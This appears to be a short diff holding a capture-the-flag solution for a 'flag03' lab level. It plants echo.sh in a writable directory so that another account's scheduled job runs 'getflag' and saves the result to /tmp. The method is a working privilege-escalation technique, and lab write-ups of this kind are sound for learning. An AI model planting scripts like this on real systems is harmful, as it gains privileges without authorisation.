@@ -1,0 +1,3 @@
+Create echo.sh in /home/flag03/writeable.d/
+#!/bin/bash
+getflag > /tmp/result.txt
